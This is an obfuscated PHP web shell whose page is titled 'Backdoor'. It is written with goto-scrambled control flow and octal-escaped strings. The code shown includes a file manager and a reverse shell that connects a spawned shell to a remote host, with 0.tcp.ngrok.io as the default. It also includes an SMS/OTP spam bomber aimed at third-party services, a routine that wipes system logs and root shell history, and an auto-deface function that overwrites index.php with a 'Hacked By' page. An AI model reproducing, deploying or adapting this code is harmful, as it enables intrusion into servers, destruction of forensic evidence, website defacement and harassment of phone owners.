     goto xbFKS;
     Z6Vib: ?>
<table width='70%' class='table-hover' align='center'>
		<tr>
	<?php  goto ERZh_;
     Z5QzU: goto hdv70;
     goto Oq_Zr;
     bnE7V: ?>
	</tr>
	</table>
<?php  goto tFi3s;
     E0ixO: echo "\74\141 h\162\145\146='?d\157=view&\146\151\154e\163\75" . getcwd() . $sep . $dir . "'>{$dir}\74/\141></\164d>";
     goto Pkd8p;
     Oq_Zr: Gjq8m: goto b3IPg;
     tFi3s: Dd4gC: goto Cd_w4;
     pmidC: if ($ext == "jpg" or $ext == "png" or $ext == "j\160eg" or $ext == "\147\151\146" or $ext == "\162\141\162" or $ext == "\172i\160" or $ext == "\144o\143" or $ext == "\160\144\146") {
         goto Gjq8m;
     }
     goto EDggY;
     xbFKS: echo "<\141 \150\162\145f=\47\77\144\157=\145d\151\164&\146\151le\163\75" . getcwd() . $sep . $dir . "\47\76{$dir}\74\57a>\74/t\144>";
     goto JUBn9;
     Pkd8p: echo "<\164d \163\164y\154\145=\47floa\164\72right;\155\141\162gi\156\55ri\147\150\164:7\160\170;'\76\xd\12\11\11<a c\154\141\163s='\142t\156 b\164\156\55su\143c\145\163\163\40\142\164n\55\170\163'\40h\162e\146='\77do\75\164o\165ch&f\151les=" . getcwd() . $sep . dirname($dir) . "\47>\116ew\40Fil\145<\57\141\76\xd\12\11\11\74a\40c\154as\163='b\164\156\40bt\156\55s\165c\143\145\163s\40\142t\156-xs\47 h\162e\146\75'?d\157\75\156\145\167\46di\162=" . getcwd() . $sep . dirname($dir) . "'>N\145w \104i\162<\57a>\xd\12\x9\x9<\141 \143\154\141\163s\75\47\142t\156\40bt\156-\163\165\143\143e\163\163 \142t\156\55\170s' h\162e\146\75\47\77do=c\150\155\157\144&f\151les=" . getcwd() . $sep . $dir . "'\76\103\150\155\157\144</a\76\15\12\11\x9<\141 \143\154a\163\163\75'\142tn \142tn\55su\143\143\145\163\163 \142t\156-xs' hre\146=\47\77d\157=r\145\156a\155e&f\151l\145s\75" . getcwd() . $sep . $dir . "'>\122\145\156ame<\57a\76\40\xd\xa\11\11<a\40class='\142\164\156\40\142tn\55s\165\143c\145ss b\164\156\55xs\47\40\150r\145\146\75'\77\144o=\144e\154ete&f\151les=" . getcwd() . $sep . $dir . "\47>\104\145le\164\145\74\57\164d>";
     goto lxDpQ;
     XfGdu: vaQ3d: goto zTGk1;
     JEMqy: echo "\74a \150\162e\146\75\47?do=o\160\145n\46\144ir\75" . getcwd() . $sep . $dir . "\47\76{$dir}<\57\141>\74/\164d\76";
     goto EnY_N;
     EnY_N: echo "\74t\144\40st\171le\75\47\146lo\141t\72\162i\147ht\73\155\141r\147i\156-\162i\147\150t\727\160\170;'>\15\12\11\11\74a\40\143l\141\163\163=\47b\164\156\40\142\164\156-\163\165cc\145\163s btn-xs' \150re\146=\47?\144o\75to\165\143\150&f\151les\75" . getcwd() . $sep . dirname($dir) . "\47>N\145\167\40\106\151l\145\74/a\76\xd\12\x9\11<a\40cl\141\163\163\75\47\142\164n \142tn-s\165\143ce\163\163\40btn-\170s\47\40h\162ef='\77d\157=\156\145w\46di\162=" . getcwd() . $sep . $dir . "\47\76N\145w \104i\162\74\57\141>\15\xa\x9\x9\74a \143\154as\163\75'b\164\156 \142t\156\55\163u\143\143\145ss\40\142\164n\55\170\163\47\40href=\47?\144\157=\143hmo\144\46\146iles\75" . getcwd() . $sep . $dir . "'>\103\150m\157d\74\57\141\76\15\12\x9\11<a\40\143\154\141ss=\47btn b\164\156-su\143\143\145s\163\40b\164\156\55\170\163\47\40\150ref=\47\77\144o\75r\145\156am\145&fi\154\145\163=" . getcwd() . $sep . $dir . "'\76\122en\141m\145\74/\141\76 \xd\12\11\11\74\141\40cl\141ss\75'btn\40\142\164n-\163u\143c\145\163\163 \142t\156\55\170s\47 h\162ef='?\144\157=de\154\145t\145\46f\151\154\145\163=" . getcwd() . $sep . $dir . "\47>\104e\154\145\164e<\57t\144>";
     goto Z5QzU;
     JUBn9: echo "\74\164d s\164y\154e\75\47\146l\157\141\164\72rig\150t;\155a\162g\151n-\162\151ght:\67p\170;'\76\15\xa\11\x9\74\141\40class=\47\142\164n \142tn\55\163\165c\143\145s\163 \142tn\55xs'\40hr\145f\75\47?\144\157\75tou\143h&f\151l\145s\75" . getcwd() . $sep . dirname($dir) . "\47>Ne\167 \106ile</\141>\15\xa\11\x9<\141\40\143\154a\163\163='\142t\156\40\142\164\156-su\143\143\145ss\40\142\164\156-xs' hr\145f\75\47?d\157=\156\145\167&\144ir\75" . getcwd() . $sep . dirname($dir) . "'\76\116e\167 \104ir\74\57\141\76\15\12\x9\11<\141 \143\154a\163s\75\47\142tn\40\142\164\156\55\163\165\143ce\163s\40\142\164\156\55x\163' \150\162e\146=\47\77d\157=chm\157d\46f\151\154\145s\75" . getcwd() . $sep . $dir . "\47>\103h\155\157d</\141\76\15\12\11\11<a \143\154\141s\163='\142\164n\40\142\164\156\55succ\145\163s\40\142t\156-\170s\47\40\150r\145f\75\47\77\144o\75\162ena\155\145\46\146\151les=" . getcwd() . $sep . $dir . "\47>Re\156\141\155\145</a\76\40\15\12\11\x9<a\40cla\163s\75\47b\164\156 b\164n\55\163\165\143\143\145\163s\40\142\164\156-\170s\47 hre\146='?\144o\75de\154e\164\145&fi\154es\75" . getcwd() . $sep . $dir . "\47>\104\145\154e\164e\74\57\164\144>";
     goto s0fYO;
     lxDpQ: hdv70: goto bnE7V;
     b3IPg: echo "\74td\76<img\40\163rc\75\47h\164t\160\163\72//\143\166\141r1\71\704.\147\151thub.i\157/t\145\170t-p\154\141i\156\55\151c\157\156.png\47\40\143l\141\163s=\47i\143on'>";
     goto E0ixO;
     ERZh_: $ext = pathinfo($dir, PATHINFO_EXTENSION);
     goto BdbX6;
     s0fYO: goto hdv70;
     goto XfGdu;
     BdbX6: if (is_dir($dir)) {
         goto vaQ3d;
     }
     goto pmidC;
     zTGk1: echo "\74t\144>\74\151m\147 s\162c\75\47http\163:\57/c\166a\162\619\70\64.g\151\164\150u\142.\151\157\57\102l\141\156\153-F\157\154\144e\162\55\151\143on.\160ng\47 \143l\141ss\75\47\151c\157n'\76";
     goto JEMqy;
     Cd_w4:
 } goto h0DV_; acC90: function XIZfI($filename)
 {
     goto DZmLr;
     arh4R: if (file_put_contents($filename, $_POST["\164e\170t"])) {
         goto ckiHe;
     }
     goto JVtU4;
     ZYUVq: echo $filename;
     goto zhx0V;
     s3yXF: ckiHe: goto bjM9z;
     UgNVA: $text = file_get_contents($filename);
     goto Giypk;
     HWcsA: PET72: goto ECV1A;
     x1nAH: die;
     goto DkaSn;
     bjM9z: jjIxg("\123u\143\145\163s");
     goto HWcsA;
     kvHTT: goto PET72;
     goto s3yXF;
     DZmLr: if (!isset($_POST["\164ext"])) {
         goto y24W1;
     }
     goto arh4R;
     ECV1A: y24W1: goto UgNVA;
     zhx0V: ?></h5>
			<textarea name="text" class="form-control" id="textarea" cols=""
				rows=""><?php  goto SEufb;
     JVtU4: JjIXG("Per\155\151\163\163\151\157n\40\104e\156\151\145\144");
     goto kvHTT;
     Giypk: ?>
<form method="post">
		<center>
			<h5>Files Editor : <?php  goto ZYUVq;
     SEufb: echo htmlspecialchars($text);
     goto S1FNm;
     S1FNm: ?></textarea>
			<br> <input type="submit" class="btn btn-danger" />
		</center>
	</form>
<?php  goto x1nAH;
     DkaSn:
 } goto yTS4n; Y0_OA: function JLDte()
 {
     goto yGgBc;
     Md_vl: $no = explode("\xa", $_POST["\156\157"]);
     goto fRA5y;
     BzGNZ: $x = 0;
     goto HtkVY;
     V9k_V: goto Olvjd;
     goto K01Ds;
     lLNor: if (isset($_POST["\141\143\164\151o\156"])) {
         goto Ygpa0;
     }
     goto VRY1K;
     SLw0m: yC5Wq: goto Bsx0N;
     efcZD: foreach ($no as $on) {
         goto mTvp3;
         zozos: NLYyO("\150tt\160:\57/\163\143.j\144\56\151\144/ph\157\156\145/\163\145\156\144\120\150o\156e\123\155\163", "p\150o\156\145=" . $on . "&\163\155\163Typ\145\751");
         goto Cn_Hp;
         tN7JA: yh0cE: goto KRkSY;
         mTvp3: echo "<h\162>Sen\144 O\124\120 T\157 \55\76\40" . $on . "<h\162>";
         goto zozos;
         Cn_Hp: Nlyyo("ht\164ps\72/\57\167\167\167\56ph\144\56\143\157.\151\144\57e\156\57u\163\145\162s\57\163e\156\144O\124\120", "ph\157ne_num\142er=" . $on);
         goto tN7JA;
         KRkSY:
     }
     goto BDIiS;
     HtkVY: Olvjd: goto kfulV;
     Eec0M: goto yC5Wq;
     goto tdywn;
     OwEfv: $x++;
     goto V9k_V;
     fRA5y: $no = str_replace("\40", '', $no);
     goto rzMqz;
     kfulV: if (!($x < 100)) {
         goto BEoWj;
     }
     goto efcZD;
     BDIiS: ns5BD: goto wu0KG;
     sz0tu: foreach ($no as $on) {
         goto FY2wO;
         FY2wO: echo "<h\162>Ca\154lin\147\11 \55> " . $on . "\74\150\162>";
         goto Tb0W2;
         QcNzq: wrdvW: goto u0GUw;
         Tb0W2: nLyYO("http\163:\57\57www\56\164okoca\163\150\56\143o\155/o\141u\164h/ot\160", "\155s\151\163\144\156=" . $on . "\46\141cc\145\160t\75ca\154\154");
         goto QcNzq;
         u0GUw:
     }
     goto WviUo;
     VRY1K: die;
     goto Eec0M;
     K01Ds: BEoWj: goto SLw0m;
     yGgBc: ?>
<center>
		<h2>Multi Spam SMS</h2>
		<form method="post">
			<textarea name="no" class="form-control" id="textarea"
				placeholder='No HP ex : 888218005037 ' required cols="" rows=""></textarea>
			<br> <input type="submit" name="action" class="btn btn-danger" />
		</form>
	</center>
<?php  goto lLNor;
     tdywn: Ygpa0: goto Md_vl;
     wu0KG: zsbIq: goto OwEfv;
     Bsx0N: die;
     goto pc4y4;
     WviUo: iBsix: goto BzGNZ;
     rzMqz: $no = str_replace("\xa\12", "\xa", $no);
     goto sz0tu;
     pc4y4:
 } goto YRYYO; j2Kba: goto CJNkO; goto btcVT; M29w9: if ($_GET["d\157"] == "\157p\145\156" and isset($_GET["\144\151r"])) {
     goto kJyiJ;
 } goto aaD85; d940G: function jJANc($filename)
 {
     goto QSXZ_;
     xvKec: AVszr: goto ia0DG;
     ia0DG: ?>
   <form method='post'>
		<center>
			<td>Filename : <input type='text' class='input-sm' id='input'
				value='<?php  goto A1Ehh;
     uA17i: jjixg("S\165\143c\145\163s");
     goto cy3MG;
     McCVo: goto aQM3J;
     goto E5fJq;
     QSXZ_: if (!isset($_POST["\141ctio\156"])) {
         goto AVszr;
     }
     goto ce2Kz;
     E5fJq: QUGiY: goto uA17i;
     A1Ehh: echo $filename;
     goto iYHz4;
     ce2Kz: if (@rename($filename, $_POST["\156ew\156\141me"])) {
         goto QUGiY;
     }
     goto VQAd_;
     cy3MG: aQM3J: goto zX5gI;
     zX5gI: TnBrl();
     goto xvKec;
     VQAd_: JJiXG("\120\145r\155\151ss\151on\40D\145ni\145d");
     goto McCVo;
     iYHz4: ?>' name='newname'></td> <input
				type='submit' class='btn btn-danger' name='action' value='rename'>
		</center>
	</form>
	<?php  goto tep_k;
     tep_k: die;
     goto Qkzhs;
     Qkzhs:
 } goto KXAl7; GP2Ek: k3J3z(); goto j2Kba; ndz_0: function hnMnJ()
 {
     goto AWrmf;
     VtCA8: XsmTY: goto hxy6J;
     vAqLC: ux4Pj("{$errstr} \50{$errno})");
     goto qjLD6;
     b3FZ3: $input = fread($sock, $chunk_size);
     goto w2MBU;
     TiYzg: Lr9Gv: goto Uvy_Q;
     Jpe_l: if ($sock) {
         goto XsmTY;
     }
     goto vAqLC;
     KCXam: function uX4PJ($string)
     {
         goto Oqm46;
         qpkSQ: if ($daemon) {
             goto xIRyh;
         }
         goto PPoZz;
         QdRzk: xIRyh: goto QWC8A;
         Oqm46: global $daemon;
         goto qpkSQ;
         PPoZz: print "{$string}\12";
         goto QdRzk;
         QWC8A:
     }
     goto B_9xj;
     hxy6J: $descriptorspec = array(0 => array("\160ipe", "r"), 1 => array("\160\151\160\145", "\167"), 2 => array("p\151\160\145", "\167"));
     goto dpKR1;
     Pqa76: exit(1);
     goto DSE52;
     d4VTI: if (!in_array($sock, $read_a)) {
         goto MEwtL;
     }
     goto QwITV;
     NeM_K: $daemon = 1;
     goto JesLj;
     QVhEA: UX4PJ("SOCK \122\105\101D");
     goto rYbNe;
     CoauX: umask(0);
     goto aC2Un;
     JesLj: M4yz0: goto FcilR;
     IZ42c: $chunk_size = 1400;
     goto ddYO9;
     JI657: fclose($pipes[2]);
     goto t6jtM;
     ADL1R: Ux4pJ("\127A\122NI\116\107: \106a\151\154\145\144\40\164o \144aem\157\156\151\163\145. \40Th\151\163 \151s qu\151te\40c\157m\155o\156\40\141\156d\40\156o\164 \146a\164\141l.");
     goto iSl_f;
     aPpXk: if (!$debug) {
         goto JJ1pp;
     }
     goto xGYTx;
     ddYO9: $write_a = null;
     goto TEXcD;
     h4_ny: stream_set_blocking($sock, 0);
     goto yVwp0;
     i4WYN: EiPhq: goto h6Sol;
     BUgg4: if (is_resource($process)) {
         goto vtgqz;
     }
     goto hixi0;
     rYbNe: jmOl9: goto b3FZ3;
     acpcj: goto EiPhq;
     goto oEO7l;
     p5SWi: exit(1);
     goto oRdYf;
     dpKR1: $process = proc_open($shell, $descriptorspec, $pipes);
     goto BUgg4;
     yoop2: if (!($pid == -1)) {
         goto L66QO;
     }
     goto UPYhD;
     iSl_f: goto M4yz0;
     goto uYEX_;
     MCrGV: if (!$debug) {
         goto kzHf7;
     }
     goto ozVEN;
     uYEX_: sXKoz: goto DSXR3;
     VB79R: $debug = 0;
     goto km4U9;
     N_dkf: kmVYk: goto Ogtyn;
     oDAd7: JJ1pp: goto w_eb_;
     aC2Un: $sock = fsockopen($ip, $port, $errno, $errstr, 30);
     goto Jpe_l;
     w2MBU: if (!$debug) {
         goto bjXkY;
     }
     goto xyHe8;
     X0CGF: $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
     goto d4VTI;
     N_aOB: stream_set_blocking($pipes[1], 0);
     goto v7cIP;
     K133l: Gerk7: goto aa_6I;
     JuMLP: $daemon = 0;
     goto VB79R;
     U74x2: bjXkY: goto rDuhH;
     Kz71S: LUsWJ: goto u8be6;
     u18Y8: if (!in_array($pipes[2], $read_a)) {
         goto LUsWJ;
     }
     goto aPpXk;
     XeAIf: if (!$pid) {
         goto Lr9Gv;
     }
     goto QlKfl;
     h6Sol: fclose($sock);
     goto ySLPn;
     rLr_R: fclose($pipes[1]);
     goto JI657;
     wYrmx: nH59i: goto DiGxl;
     QlKfl: exit(0);
     goto TiYzg;
     oRdYf: L66QO: goto XeAIf;
     AWrmf: if (isset($_POST["\141c\164i\157\156"])) {
         goto sGFej;
     }
     goto sX2M3;
     iaPNR: zAEGj: goto u18Y8;
     yVwp0: Ux4pj("<\146ont col\157r\75\171\145\154lo\167>S\165cc\145s\163\146ul\154y\40o\160e\156ed \162\145\166\145\162se\40s\150e\154\154 \164o\40{$ip}\72{$port} <\57\146\157n\164>");
     goto wYrmx;
     CXiR0: if (!feof($pipes[1])) {
         goto U5lzq;
     }
     goto yfJB6;
     ySLPn: fclose($pipes[0]);
     goto rLr_R;
     xGYTx: uX4pj("STDER\122\40\122EA\104");
     goto oDAd7;
     nVOwv: die;
     goto V4hTm;
     TEXcD: $error_a = null;
     goto JuMLP;
     rDuhH: fwrite($pipes[0], $input);
     goto DCwvK;
     sX2M3: ?>
<center>
<h2>Reverse Shell</h2>
<form method='post'>
	<table align="center">
	<tr>
		<td align="center"><input type='text' class='input-sm' id='input' value='0.tcp.ngrok.io' name='ip'/></td>
	</tr>
	<tr>
		<td align="center"><input type='text' class='input-sm' id='input' value='666' name='port'/></td>
	</tr>
	<tr>
		<td colspan="3">
			<center>
				<input type='submit' class='btn btn-danger' name='action' value='Open Connection'/>
			</center>
		</td>
	</tr>
</table>
</form>
	<?php  goto nVOwv;
     yfJB6: ux4Pj("\105\122\122\117\122\72\40Shel\154\40p\162oces\163\40t\145r\155\151nate\144");
     goto acpcj;
     fnlVr: T5NcQ: goto NeM_K;
     hixi0: UX4PJ("E\122R\117R:\40\103a\156\47\164\40\163\160\141\167\156 she\154\154");
     goto Pqa76;
     hYpTp: sGFej: goto IZ42c;
     DCwvK: MEwtL: goto fpiy6;
     DSE52: vtgqz: goto zAr8Q;
     Sr6dw: exit(1);
     goto fnlVr;
     HHTlE: goto EiPhq;
     goto ubmAe;
     Rio3t: if (!$debug) {
         goto Gerk7;
     }
     goto aoY0j;
     u8be6: goto nH59i;
     goto i4WYN;
     lgcUM: sdkbx: goto kdvhl;
     w_eb_: $input = fread($pipes[2], $chunk_size);
     goto MCrGV;
     uxrYt: uX4Pj("ERRO\122\72 \123h\145ll\40\143o\156\156\145c\164i\157n\40\164e\162\155\151n\141\164\145d");
     goto HHTlE;
     QwITV: if (!$debug) {
         goto jmOl9;
     }
     goto QVhEA;
     Ogtyn: $input = fread($pipes[1], $chunk_size);
     goto Rio3t;
     v7cIP: stream_set_blocking($pipes[2], 0);
     goto h4_ny;
     t6jtM: proc_close($process);
     goto lgcUM;
     aoY0j: Ux4pJ("\123TD\117U\124: {$input}");
     goto K133l;
     wfesc: UX4pJ("ST\104\117UT \122EA\104");
     goto N_dkf;
     TLkda: if (!feof($sock)) {
         goto BOjn4;
     }
     goto uxrYt;
     xyHe8: ux4pJ("\123OC\113: {$input}");
     goto U74x2;
     VYdYD: kzHf7: goto bg2sL;
     ozVEN: Ux4pj("\123TD\105\122R\72\40{$input}");
     goto VYdYD;
     Uvy_Q: if (!(O1U31() == -1)) {
         goto T5NcQ;
     }
     goto ivqxt;
     DiGxl: if (!1) {
         goto EiPhq;
     }
     goto TLkda;
     UPYhD: UX4Pj("\105RR\117\122\72 Can\47t fo\162\153");
     goto p5SWi;
     km4U9: $ip = $_POST["\151p"];
     goto o7dsZ;
     aa_6I: fwrite($sock, $input);
     goto iaPNR;
     bg2sL: fwrite($sock, $input);
     goto Kz71S;
     FcilR: chdir("\57");
     goto CoauX;
     fpiy6: if (!in_array($pipes[1], $read_a)) {
         goto zAEGj;
     }
     goto whJ9k;
     d5CVl: $read_a = array($sock, $pipes[1], $pipes[2]);
     goto X0CGF;
     whJ9k: if (!$debug) {
         goto kmVYk;
     }
     goto wfesc;
     zAr8Q: stream_set_blocking($pipes[0], 0);
     goto N_aOB;
     ubmAe: BOjn4: goto CXiR0;
     DSXR3: $pid = IfKDF();
     goto yoop2;
     oEO7l: U5lzq: goto d5CVl;
     ivqxt: uX4PJ("\105\162\162\157r\72 \103an\47t \163et\163\151\144\50\51");
     goto Sr6dw;
     qjLD6: exit(1);
     goto VtCA8;
     o7dsZ: $port = $_POST["\160\157\162\164"];
     goto KCXam;
     V4hTm: goto sdkbx;
     goto hYpTp;
     B_9xj: if (function_exists("\151fkd\146")) {
         goto sXKoz;
     }
     goto ADL1R;
     kdvhl:
 } goto T3NUU; P5p0o: if ($_GET["d\157"] == "\143\157nfi\147") {
     goto OExGh;
 } goto Linvc; eptYg: SpMG1($_GET["\146i\154\145\163"]); goto g5XV0; OToAi: if ($_GET["d\157"] == "\152\165\155p\151ng") {
     goto qH8q8;
 } goto P5p0o; AhvnH: if (copy($_FILES["\146\151le"]["\164mp_\156am\145"], getcwd() . $sep . $_FILES["f\151\154e"]["na\155e"])) {
     goto cVxIB;
 } goto rA38k; oUttM: function UIeKR()
 {
     goto hmsid;
     krgNl: @T9GAW("/\166\141\162/ru\156\57ut\155\160");
     goto sneM1;
     sneM1: @t9gAW("\57v\141\162\57\154\157gs");
     goto apb5X;
     apb5X: @t9gaW("/v\141\162/\154og");
     goto OGHTH;
     OGHTH: @T9Gaw("/\166a\162\57\141d\155");
     goto qYhF3;
     Sic05: @T9gAw("\145\162\162\157\162\137\154\157\147");
     goto A5ppO;
     Q7oXB: lxANx: goto d83M8;
     ELh46: @T9Gaw("/\166ar/\154og\57wt\155\160");
     goto MDZUd;
     d83M8: @t9GAw(".c\157\156\146i\147");
     goto k8SzY;
     Uxi6c: jjIxG("L\157\147s\40\151\163\40\143l\145\141r");
     goto NDrs9;
     skCe5: foreach (range("A", "\132") as $drive) {
         goto jpjRS;
         c2SMB: B8rjw: goto MbXBc;
         jpjRS: @T9GAW($drive . "\72\xampp\a\160ac\150e\134\154o\147s\\145r\162or\56\154\157\147");
         goto QINQJ;
         QINQJ: @t9gAW($drive . ":\134xamp\160\134\141\160a\143h\145\134\154ogs\134\141c\143ess.l\157g");
         goto c2SMB;
         MbXBc:
     }
     goto Q7oXB;
     A5ppO: CIi80: goto Uxi6c;
     z6mLC: @t9Gaw("\57v\141r/a\160\141\143\150e/log");
     goto krgNl;
     k8SzY: goto CIi80;
     goto ZlYyz;
     bZFBQ: @t9gAw("\57\165\163r/\154oca\154\57\141pa\143\150e/lo\147");
     goto zUPhI;
     I5Kuh: @T9gAW("/ro\157t/\56b\141\163h\137histo\162y");
     goto tvLA8;
     jBL66: @t9GaW("\57\145\164c/\165tm\160");
     goto Z5TxT;
     hmsid: global $os;
     goto mXtLh;
     MDZUd: @t9GAW("\56co\156\146ig");
     goto Sic05;
     tvLA8: @T9GAw("/r\157o\164/\56b\141sh_\154\157\147out");
     goto G86Ut;
     Z5TxT: @T9GAw("/\166ar/\154og/la\163tlog");
     goto ELh46;
     zUPhI: @t9gAw("\57\166\141\162\57\141p\141\143\150\145\57lo\147s");
     goto z6mLC;
     ZlYyz: BDpqJ: goto rFTz2;
     iKHwL: @t9gaw("\57root\57\56k\163\150_\150\151\163tor\171");
     goto I5Kuh;
     G86Ut: @t9GaW("/\165\163r\57\154oc\141\154\57\141pa\143he\57l\157g\163");
     goto bZFBQ;
     qYhF3: @t9gaw("\57\145\164c/\167\164\155\160");
     goto jBL66;
     mXtLh: if ($os == "\114\151\156\165\170") {
         goto BDpqJ;
     }
     goto skCe5;
     rFTz2: @t9gAW("/t\155\160\57\154\157\147s");
     goto iKHwL;
     NDrs9:
 } goto rgZdR; s63LX: w41X1: goto v0HnU; kWim3: exit; goto PoQ0Q; uZ0y4: vL5pr: goto UQWtE; lALpc: goto Jkk29; goto WdooI; tUoBK: if ($_GET["\144\157"] == "cgi") {
     goto zV8YQ;
 } goto Kk0wn; CHviX: if ($_GET["\144\157"] == "c\155\144") {
     goto UdMDI;
 } goto haBwC; bB4u4: goto Jkk29; goto qmWpE; buNrn: goto Jkk29; goto ANdEW; Kk0wn: if ($_GET["\144o"] == "d\145fac\145") {
     goto zBGpp;
 } goto v33r3; PoQ0Q: vdcmX: goto q3ebb; d3Ydz: ?>
<!DOCTYPE html>
<html>
<head>
	<title>Backdoor</title>
	<!-- CSS STYLE-->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<link rel="shortcut icon" href="https://cvar1984.github.io/favicon.png" />
	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js" type="text/javascript"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" type="text/javascript"></script>
	<style type='text/css'>
	body {
		background: black;
		color: lavender;
		text-shadow: 2px 2px 4px #000000;
		background: url(https://cvar1984.github.io/bg-2.jpg) no-repeat center center fixed;
		-webkit-background-size: cover;
		-moz-background-size: cover;
		-o-background-size: cover;
		background-size: cover;
	}

	@font-face {
		font-family: 'Orbitron';
		font-style: normal;
		font-weight: 700;
		src: local('Orbitron Bold'), local('Orbitron-Bold'),
		url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2) format('woff2');
		unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
		U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
		U+2212, U+2215, U+FEFF, U+FFFD;
	}

	li {
		display: inline;
		text-shadow: 2px 2px 4px #000000;
		font-size: 17px;
	}

	a {
		color: lime;
	}

	a:hover {
		color: black;
	}

	table,
	tr,
	td {
		border: 1px;
		-webkit-border: 1px;
		-moz-border: 1px;
		-o-border: 1px;
	}

	table {
		-webkit-width:800px;
		-moz-width:800px;
		-o-width:800px;
		-webkit-height:auto;
		-moz-height:auto;
		-o-height:auto;
		width:800px;
		height:auto;
	}

	nav {

	}

	.table-hover {
		border: 1px solid green;
		cellpadding: 3;
		cellspacing: 3;
		font-size: 15px;
	}

	#textarea {
		background: url(https://cvar1984.github.io/textarea-bg.jpg) no-repeat center center fixed;
		-webkit-background-size: cover;
		-moz-background-size: cover;
		-o-background-size: cover;
		background-size: cover;
		width: 1066px;
		height: 500px;
		font-family: Arial, Helvetica, monospace;
		color: lavender;
		border: 1px solid lime;
	}

	#input {
		background: transparent;
		width: 250px;
		font-family: Arial, Helvetica, monospace;
		color: lavender;
		border: 1px solid lime;
	}

	#menu {}

	* {
		font-family: 'Orbitron';
	}

	.icon {
		width: 20px;
		height: 20px;
	}
	.iframe {
		-webkit-width: 100vw;
		-moz-width: 100vw;
		-o-width: 100vw;
		width: 100vw;
		height: 100vh;
		position: relative;
	}
	span {
		color:red;
	}
	</style>
</head>
<body>
<?php  goto xqfOY; xD83Z: A4P0T(); goto prBdu; s08OF: function uHcbw()
 {
     goto Qffdx;
     Timcq: RMs_m: goto xbnuI;
     CvLGg: PoF8r: goto KeWoN;
     wOdOQ: jjIxG("\151\156d\145\170.\160hp\40D\145faced");
     goto Timcq;
     xU8IC: $file = str_replace("J\165st J\157k\145\40:v", $_POST["ale\162\164"], $file);
     goto YluzR;
     Z7RC6: if (file_exists("\151nd\145x.\160\150\160")) {
         goto uvDjW;
     }
     goto rON0Z;
     njm5E: ?>
<center><h2>Auto Deface With Backup</h2></center>
<form method='post'>
	<table align="center">
		<tr>
			<td>Title</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='title'></td>
			</tr>
		<tr>
			<td>Alert Message</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='Just Joke :v' name='alert'></td>
			</tr>
		<tr>
			<td>Music Link</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/bg.mp3' name='music'></td>
			</tr>
		<tr>
			<td>Image Link</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/logo.png' name='images'></td>
			</tr>
		<tr>
			<td>Content</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='content'></td>
			</tr>
		<tr>
			<td>Sub Content</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='This Pain Is Wonderful' name='sub_content'></td>
			</tr>
		</table>
		<center>
			<br /><input type='submit' class='btn btn-danger' name='action' value='Deface'>
		</center>
</form>
	<?php  goto noiJ8;
     BKRdV: goto gHwL8;
     goto m_eBL;
     noiJ8: die;
     goto AfVFV;
     vkuQQ: if (!file_put_contents("\151\156\144\145x.\160hp", $file)) {
         goto RMs_m;
     }
     goto wOdOQ;
     kXth9: chmod("i\156\144\145x\56\160hp.\142\141\153", "044\64");
     goto vkuQQ;
     Zu9DK: $file = str_replace("\74\150\61>\110a\143\153e\144 \102y Cva\16219\704\74/h\61\76", "<\150\61\76" . $_POST["\143on\164e\156t"] . "</\1501>", $file);
     goto f8ui7;
     QUDth: if (!file_put_contents("index.\160hp", $file)) {
         goto EP_0f;
     }
     goto O5tAE;
     O5tAE: JJiXG("\151nde\170.p\150\160 \104ef\141\143e\144");
     goto znHhG;
     xbnuI: goto gHwL8;
     goto CvLGg;
     f8ui7: $file = str_replace("<\150\64\76\124his\40P\141\151\156\40\111s Wo\156derful\74/\150\64>", "<\1504\76" . $_POST["\163ub_\143o\156\164\145\156t"] . "\74\57\150\64>", $file);
     goto Z7RC6;
     rzEjr: IEUze: goto p3_3m;
     O1tJA: $file = str_replace("<\164\151tle\76\110\141\143ked\40B\171 \103v\141r19\704</title>", "<\164itle>" . $_POST["tit\154e"] . "\74/titl\145>", $file);
     goto K2nMX;
     p3_3m: gHwL8: goto pk0A6;
     YluzR: $file = str_replace("\150\164\164\160s\72/\57mine\162v\141gunc\145\154eri\56fi\154\145\163\56\167\157\162\144pr\145\163\163.\143om/20\61\64\57\608\57\154o\147\157.\160n\147", $_POST["\151\155\141ges"], $file);
     goto Zu9DK;
     wM7NK: if (!file_put_contents("ind\145\170\56\150tml", $file)) {
         goto IEUze;
     }
     goto tLaAa;
     K2nMX: $file = str_replace("\150\164\164\160\163:\57\57\143v\141r198\64.gi\164\150u\142.io/\142g\56mp\63", $_POST["m\165si\143"], $file);
     goto xU8IC;
     drh5w: rename("inde\170.p\150\160", "\151\156d\145\170.\160\150p.bak");
     goto kXth9;
     m_eBL: uvDjW: goto drh5w;
     TKbmP: chmod("in\144\145x\56\150tml.bak", "\60444");
     goto wM7NK;
     tLaAa: jjIxg("\151n\144e\170\56h\164m\154 D\145fa\143ed");
     goto rzEjr;
     pk0A6: h4B8O: goto njm5E;
     Qffdx: if (!isset($_POST["\141ct\151\157n"])) {
         goto h4B8O;
     }
     goto Ycw7z;
     Ycw7z: $file = file_get_contents("\150tt\160\163:\57\57g\151\163\164.g\151th\165b\165se\162\143on\164\145n\164\56co\155/\103\166ar1\7184/\63\142\146d\1448d2\14309f8\70\709440\1419\146\674\1466\611\64\141\604\57ra\167/\70\719\6508\1448\60e\143\67e\142a5\67\63bfb9\61a\146\60\7025\706e26bf\671\145\64/\151\156\144e\170\56\160\150\160");
     goto O1tJA;
     rON0Z: if (file_exists("ind\145x\56\150tml")) {
         goto PoF8r;
     }
